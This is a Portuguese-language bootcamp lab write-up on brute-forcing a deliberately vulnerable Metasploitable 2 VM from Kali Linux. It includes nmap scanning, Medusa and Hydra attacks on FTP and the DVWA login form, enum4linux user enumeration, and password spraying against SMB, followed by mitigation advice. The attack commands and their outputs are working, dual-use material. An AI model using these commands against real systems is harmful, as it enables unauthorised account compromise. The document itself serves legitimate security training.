# Desafio - Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
Entrega do desafio para o estudo do ambiente "Kali Linux" e da ferramenta Medusa, realizado durante o bootcamp de Cibersegurança Riachuelo na plataforma DIO.

### Realizado em 01/04/2026 por Felipe Thiago da Silva


## Contexto e Objetivo
A ideia deste projeto é documentar o aprendizado envolvendo a configuração, implementação e ataque de um ambiente vulnerável do *Metasploitable 2*, utilizando ataques simulados para obter dados sensíveis através de ferramentas disponibilizadas pelo *Kali Linux*, tal como visto em aula durante o módulo do desafio. Propõe-se também a catalogar eventuais problemas encontrados e soluções, buscando realizar ataques de força bruta em FTP e formuário web.

## Ferramentas utilizadas
### VirtualBox
Software de virtualização de sistemas operacionais, permitindo a configuração de hardware e software de forma virtual, aqui sendo utilizado o Kali Linux e o Metasploitable 2. Ambas as máquinas utilizadas neste documento foram configuradas com o adaptador de rede "host-only".

### Metasploitable 2
Distribuição Linux voltada ao estudo de cibersegurança simulando uma rede completamente vulnerável, da qual pode ser atacada em forma de prática sem que haja qualquer dano a máquinas reais. Possui serviços e portas vulneráveis, como com o SSH, FTP e Samba, além de aplicações web, como o DVWA.

#### Observação: Problema na inicialização
Ao inicializar a instância do Metasploitable 2, pode ser que apareça um erro com a seguinte mensagem:
```bash
Starting up ...
[] ..MP-BIOS bug: 8254 timer not connected to IO-APIC
[] Kernel panic - not syncing: IO-APIC + timer doesn't work! Boot with apic=debug and send a report. Then try booting with the 'noapic' option
```
Este problema pode estar associado ao conflito entre o hipervisor nativo do Windows - Hyper-V - e o VirtualBox e, enquanto simplesmente desativar o Hyper-V do sistema não funcione, a solução encontrada foi modificar as configurações de acpi e ioapic no Windows Powershell:
```Powershell
vboxmanage modifyvm Metasploitable --acpi off
vboxmanage modifyvm Metasploitable --ioapic off
```


### Kali Linux
Distribuição Linux voltada ao estudo e aplicação de testes de segurança de rede, testes de penetração (pentests) e hacking ético. \
Contém diversas ferramentas que visam explorar um sistema alvo, incluindo formas de ataques de força bruta a usuários, das quais foram utilizadas as seguintes:

#### MEDUSA
- Voltada a ataques de rede com foco em velocidade e escalabilidade
- Suporta muitos protocolos
- Ataque a diversos usuários e diversas senhas ao mesmo tempo (multithread)
- Permite parametros personalizados de acordo com o protocolo (melhor precisão)
- Não é tão adaptada a ataques web como formulários dinamicos
- Testa desempenho e paralelismo

#### HYDRA
- Ferramenta voltada a ataques de bruteforce, baseada em redes
- Possui compatibilidade com mais de 50 protocolos diferentes
- Menos eficiente para ataques offline, como quebra de hashes
- A força está em tentar várias tentativas de senhas em tempo real via rede

\
Como alternativas também valem de estudo as ferramentas "NCRACK", "JOHN", "WPSCAN" e "PATATOR", voltadas especificamente a ataques de força bruta, porém, cada um com pontos fortes e fracos para cada situação de uso.

## Descrição
### Antecedentes
Instanciada a máquina do Metasploitable, para os testes é importante saber seu endereço de ip, obtido com o comando 'ip a':
```bash
msfadminip@metasploitable:~$ ip a
```
que nos retorna o inet para 'eth0': 192.168.56.101. \
Enquanto este seja um endereço obtido apenas para testes, teríamos o endereço de ambientes reais obtidos através de outras formas, como através de engenharia social ou brechas específicas. Além disso, sabemos que há um usuário e senha padrão para o sistema ('msfadmin'), os quais incluem-se de forma artificial nas wordlists.

\
Em seguida, já no ambiente Kali, pode-se iniciar o "estudo" da máquina-alvo através de uma varredura de portas:
```bash
felipe@kali:~$ nmap -sV -p 21,22,80,445,139 192.168.56.101
```
Este comando verifica portas vulneráveis a tipos específicos de ataques, dependendo do serviço que as representa. Nesse sentido, definimos que estamos procurando aberturas especificamente para o FTP, SSH, HTTP, SMB e NetBIOS, e pedimos pela versão dos serviços representados através da flag -sV, que pode entregar detalhes para brechas específicas e catalogadas neste meio.

\
Sabendo que a porta para o FTP está aberta, tentamos nos conectar ao alvo facilmente com:
```bash
felipe@kali:~$ ftp 192.168.56.101
```
Este comando nos revela uma conexão com sucesso, no entanto, ainda necessita-se de um usuário e senha para acesso total ao sistema.

### Aplicando bruteforce em FTP
Como forma de tentar descobrir o usuário e a senha, podemos aplicar métodos de força bruta com a ferramenta **Medusa**. Para isso, é necessário montar duas listas - chamadas wordlists -, com possíveis nomes de usuário e senha, de forma que serão testados no sistema com todas as combinações possíveis. Para os nomes possíveis, delimitamos tentativas de nomes de admin.
\
Para a wordlist, além de estudar o usuário alvo e aplicar tentativas manuais baseadas em dados pessoais, existem listas públicas na internet que são montadas a partir de vazamentos e estudos anuais que revelam quais são as senhas mais comuns entre os usuários, revelando uma insegurança em senhas fracas ou inalteradas a partir dos dados padrão do sistema. Neste caso, sabemos que o "alvo" possui uma instância do sistema "Metasploitable 2", que possui por padrão o usuário e senha 'msfadmin'. Esses dados serão inseridos artificialmente.
\
\
Obs.: Um banco de senhas está disponível neste [repositório do GitHub](https://github.com/danieldonda/wordlist/tree/master?tab=readme-ov-file)  \
Ele inclui listas de senhas mais utilizadas e também temas específicos, como músicas, filmes, interesses, plantas, animais etc. Esses temas podem servir de palavras comuns utilizadas em senhas, valendo a pena serem testados.
\
\
A criação das listas é feita por:
```bash
felipe@kali:~$ echo -e 'user\nmsfadmin\nadmin\nroot\nadministrador\nraiz\nadm\nuserroot\nuseradmin' > users.txt
felipe@kali:~$ echo -e 'msfadmin\n123456\npassword1\npassword\n123456789\n12345678\n111111\n1234567\nsunshine\nqwerty\n654321' > pass.txt
```

Em seguida, aplicamos o Meudsa para automatizar um ataque de força bruta a partir destes dados, mais especificamente no modo ftp e com o uso de 6 threads (realizando tentativas simultâneas para maior velocidade):
```bash
felipe@kali:~$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

### Aplicando bruteforce em formuário web (DVWA) com Medusa
Sabendo que a porta correspondente ao HTTP está aberta, podemos tentar invadir através dele, em especial neste caso ao DVWA, que age como uma página padrão de ataque (semelhante ao que encontraríamos com o PHP). Desta forma, sabendo que o **Medusa** possui compatiblidade com o http, podemos tentar:
```bash
felipe@kali:~$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
	-m PAGE:"/dvwa/login.php" \
	-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
	-m "FAIL=Login failed" -t 6
```
Em resposta ao comando, o medusa nos traz todas as tentativas de forma automatizada e, caso encontre um usuário e senha compatível, responde com um **sucesso**:
```bash
2026-04-01 14:02:45 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: password (1 of 4 complete)
2026-04-01 14:02:45 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
```

Outra opção de ataque é descrita na internet da seguinte forma:
```bash
felipe@kali:~$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m FORM:/dvwa/login.php:username_field=password_field -t 5
```

No entanto, os parâmetros podem variar de acordo com a versão. Desta forma, para saber se há compatibilidade e a atual forma de se utilizar, podemos entender melhor com o comando:
```bash
felipe@kali:~$ medusa -M http -q
```

#### Observação: problema ao realizar bruteforce
Como visto através do comando *medusa -M http -q*, percebe-se que há uma discrepância entre os parâmetros dos exemplos aplicados e os exemplos definidos pela própria documentação, o que acaba por trazer as mensagens de erro:
```bash
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
```
Além de um resultado de "sucesso" para todas as combinações de usuário e senha dadas, mesmo que elas não representem de verdade um usuário. Aplicar os mesmos parâmetros do exemplo da documentação também não parecem trazer o resultado esperado, então, como alternativa, pode-se tentar outras ferramentas especializadas, como o Hydra.

### Alternativa: Bruteforce em formulário web com Hydra
Mesmo sabendo que o Medusa possui compatibilidade com o HTTP (apesar de formalmente definido que não é sua especialidade), se a entrega do conteúdo de usuário e senha não sair como o esperado, uma alternativa acaba sendo a ferramenta Hydra.
\
Para o Hydra, podemos atuar de forma muito semelhante, criando wordlists para a tentativa automática de combinações de usuário e senha:
```bash
felipe@kali:~$ echo -e 'user\nmsfadmin\nadmin\nroot\nadministrador\nraiz\nadm\nuserroot\nuseradmin' > users.txt
felipe@kali:~$ echo -e 'msfadmin\n123456\npassword1\npassword\n123456789\n12345678\n111111\n1234567\nsunshine\nqwerty\n654321' > pass.txt
```

Desta forma, podemos simplesmente realizar o ataque trazendo o parâmetro "http-post-form" no formato seguinte:
```bash
felipe@kali:~$ hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

Como resultado, obtemos a mensagem "Login failed" para outras tentativas e apenas um retorno para o usuário e senha de sucesso:
```bash
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-01 14:12:56
```

### Realizando enumeração de usuários
Explorando um pouco mais a máquina alvo, podemos tentar descobrir usuários cadastrados através da ferramenta de enumeração **enum4linux**. Esta ferramenta gera um arquivo de texto com resultados de nomes, domínios, detalhes e algumas descrições sensíveis acerca do sistema sendo explorado. Sua utilização se dá por:
```bash
felipe@kali:~$ enum4linux -a 192.168.56.101 | tee enum4_output.txt

felipe@kali:~$ less enum4_output.txt
```

Entre as informações fornecidas no arquivo *enum4_output.txt* (aberto com o comando less), há uma lista de usuários com permissões específicas:
```bash
[...]
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
[...]
```
Com esses dados, podemos ter uma ideia, por exemplo, de como atacar através do ftp, buscando acessos específicos por usuário, permissões ou até mesmo o nível de admin. Assim, temos uma limitação de nomes conhecidos, bastando realizar o bruteforce para as senhas possíveis.


### Realizando Password Spraying em SMB
Uma outra forma de atacar um sistema ocorre através do *Password Spraying*, uma técnica que visa contornar possíveis contra-medidas a ataques com o bloqueamento de múltiplas tentativas de login, o que acaba por barrar as formas mais comuns de ataque de força bruta. Desta forma, o próprio Medusa disponibiliza um método de ataque em múltiplos usuários ao mesmo tempo com as mesmas senhas, em paralelo, com a flag -T. Assim como outras formas de ataque, precisamos de wordlists como nomes e senhas a serem testados.
\
Para os nomes de usuários, podemos informar aqueles obtidos pela técnica de enumeração de usuários, enquanto as senhas acabam vindo de informações pessoais do alvo ou de listas públicas na internet:
```bash
felipe@kali:~$ echo -e "user\nmsfadmin\nservice\ngames\nbind\nsyslog" > smb_users.txt

felipe@kali:~$ echo -e 'msfadmin\n123456\npassword1\npassword\n123456789\n12345678\n111111\n1234567\nsunshine\nqwerty\n654321' > senhas_spray.txt
```

\
Para este exemplo, o ataque ocorre ao protocolo SMB do sistema, buscando o sistema de compartilhamento de arquivos, pastas, impressoras etc. através da porta 445. Como dito antes, a diferença está no uso da flag -T, onde define-se quantos hosts em paralelo queremos utilizar para o ataque:
```bash
felipe@kali:~$ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

Este comando nos retorna todas as tentativas de acesso ao SMB, incluindo onde houve sucesso:
```bash
2026-03-30 12:37:59 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

Tendo esta informação, podemos tirar a prova e verificar se há acesso de administrador com o usuário descoberto através do seguinte comando:
```bash
felipe@kali:~$ smbclient -L //192.168.56.101 -U msfadmin
```

## Conclusão e recomendações de mitigação
De acordo com o observado nestas técnicas de exploração, entende-se que há informações que parecem simples, mas são extremamente perigosas, permitindo até mesmo o acesso a nível de administrador a um sistema, permitindo a leitura de arquivos sigilosos, descoberta de dados pessoais e brechas para destruição de um hardware. Contra esse perigo observado, recomenda-se algumas formas de mitigação:
- Troca de senhas padrão de um sistema operacional;
- Utilização de senhas fortes e imprevisíveis;
- Troca de senhas regularmente;
- Bloqueio de portas;
- Bloqueio de informações de versões e nomes de serviços que utilizam portas;
- Bloqueio de ips que realizam múltiplas tentativas de acesso a um formulário.
